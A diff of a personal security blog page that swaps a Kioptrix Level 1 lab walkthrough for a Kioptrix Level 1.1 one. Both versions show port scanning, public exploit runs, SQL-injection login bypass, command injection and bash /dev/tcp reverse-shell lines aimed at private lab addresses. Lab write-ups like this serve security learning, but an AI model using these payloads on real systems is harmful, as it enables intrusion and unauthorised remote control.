@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>Kioptrix: Level 1 | 老白</title>
+        <title>Kioptrix: Level 1.1 | 老白</title>
         <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -49,71 +49,66 @@
                 <div class="mdui-row">
                         <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                 <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="post-title  mdui-m-b-1">Kioptrix: Level 1</div>
-                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-07-10 19:19:26">2021-07-10 / 2 min read</div>
-                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="主机扫描">主机扫描</h1>
-<p><code>netdiscover -i eth0 -r 192.168.223.135</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924059869.png" alt="" loading="lazy"></p>
+                                    <div class="post-title  mdui-m-b-1">Kioptrix: Level 1.1</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-07-24 19:51:08">2021-07-24 / 2 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="主机探测">主机探测</h1>
+<p><code>netdiscover –i eth0 –r 192.168.223.0/24</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926072878.png" alt="" loading="lazy"></p>
 <h1 id="端口探测">端口探测</h1>
-<p><code>masscan -p 0-65535 --rate=10000 192.168.223.136</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924298546.png" alt="" loading="lazy"></p>
-<h1 id="服务探测">服务探测</h1>
-<p><code>nmap -A -sV -T4 -O -p 22,1024,139,80,111,443 192.168.223.136</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924453316.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924336402.png" alt="" loading="lazy"></p>
+<p><img src="https://V-alkoinen.github.io/post-images/1644926083944.png" alt="" loading="lazy"><br>
+ 发现3306、443、111、677、631、80、22</p>
+<h1 id="服务识别">服务识别</h1>
+<p><code>nmap -A -sV -T4 -O -p 22,80,111,443,677,631,3306 192.168.223.137</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926914904.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926134246.png" alt="" loading="lazy"></p>
 <h1 id="web">web</h1>
-<p><code>Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924623623.png" alt="" loading="lazy"></p>
-<p>  爆一下路径<br>
-<code>Dirb http://192.168.223.136 /usr/share/dirb/wordlists/big.txt</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924713053.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924964453.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644924986104.png" alt="" loading="lazy"><br>
- 发现openssl版本0.9.6，版本过低，以至于不存在心脏滴血，Mod_ssl版本2.8.4<br>
-<code>searchsploit mod_ssl</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925058787.png" alt="" loading="lazy"><br>
- 缓冲区溢出<br>
-<img src="https://V-alkoinen.github.io/post-images/1644925109083.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925114649.png" alt="" loading="lazy"><br>
-<code>apt-get install libssl-dev</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925186920.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925192673.png" alt="" loading="lazy"></p>
-<pre><code>用法: ./OpenFuck target host [port] [-c N]	
-C:开放n个连接
-系统:redhat 	
-apache: 1.3.20
+<p><code>dirb http://192.168.223.137 /usr/share/dirb/wordlists/big.txt</code></p>
+<pre><code>http://192.168.223.137
 </code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1644925238614.png" alt="" loading="lazy"><br>
-<code>./OpenFuck 0x6a 192.168.223.136 -c 50</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925261719.png" alt="" loading="lazy"><br>
- 报错，选用0x6b<br>
-<code>./OpenFuck 0x6b 192.168.223.136 -c 50</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925302425.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925357759.png" alt="" loading="lazy"></p>
-<h1 id="samba">Samba</h1>
-<p><img src="https://V-alkoinen.github.io/post-images/1644925395072.png" alt="" loading="lazy"><br>
-<code>Searchsploit samba</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925419833.png" alt="" loading="lazy"><br>
- 找一个RCE然后复制到本地<br>
-<code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925455439.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925472362.png" alt="" loading="lazy"><br>
-<code>./exp -c 192.168.223.134 -b=0 192.168.223.136</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1644925495227.png" alt="" loading="lazy"></p>
-<pre><code>本地监听端口 nc –nvlp 4444
-远程弹bash
-bash -i &gt;&amp; /dev/tcp/192.168.223.134/4444 0&gt;&amp;1
+<p><img src="https://V-alkoinen.github.io/post-images/1644926269998.png" alt="" loading="lazy"><br>
+ 尝试弱口令无果，尝试万能密码<br>
+<code>123' or 1=1—</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926308341.png" alt="" loading="lazy"><br>
+ 发现另一页面，但是无法输入，看看返回包<br>
+<img src="https://V-alkoinen.github.io/post-images/1644926339395.png" alt="" loading="lazy"><br>
+ 发现有两个input框，但是被源码中一个单引号注释了，那就直接修改他的返回包，删除单引号，返回如下：<br>
+<img src="https://V-alkoinen.github.io/post-images/1644926367622.png" alt="" loading="lazy"><br>
+ 输入127.0.0.1验证功能，并尝试命令拼接<br>
+<img src="https://V-alkoinen.github.io/post-images/1644926948717.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926957360.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926963486.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926974014.png" alt="" loading="lazy"><br>
+ 运行反弹shell语句，成功弹回shell<br>
+<code>127.0.0.1;bash -i &gt;&amp; /dev/tcp/192.168.223.135/4444 0&gt;&amp;1</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926487609.png" alt="" loading="lazy"><br>
+ 尝试提权：查看linux版本</p>
+<pre><code>uname -a
+cat /etc/issue
+cat /proc/version
+cat /etc/redhat-release
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644925532107.png" alt="" loading="lazy"></figure>
+<p><img src="https://V-alkoinen.github.io/post-images/1644926991854.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644926996846.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644927001744.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644927006521.png" alt="" loading="lazy"><br>
+ 发现为centos 4.5<br>
+<code>Searchsploit centos 4.5</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644927021806.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644927029471.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644927035072.png" alt="" loading="lazy"><br>
+ 下载exp并执行<br>
+<img src="https://V-alkoinen.github.io/post-images/1644927043327.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644927048396.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644927052641.png" alt="" loading="lazy"></p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/kioptrix-level-11/">Kioptrix: Level 1.1</a></div></div>
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/Dependency Confusion/">Dependency Confusion</a></div></div>
                                         
 
                                         
-                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/gophish-diao-yu-gong-ju-shi-yong/">gophish钓鱼工具使用</a></div> </div>
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/kioptrix-level-1/">Kioptrix: Level 1</a></div> </div>
                                        
                                       </div>
                                    
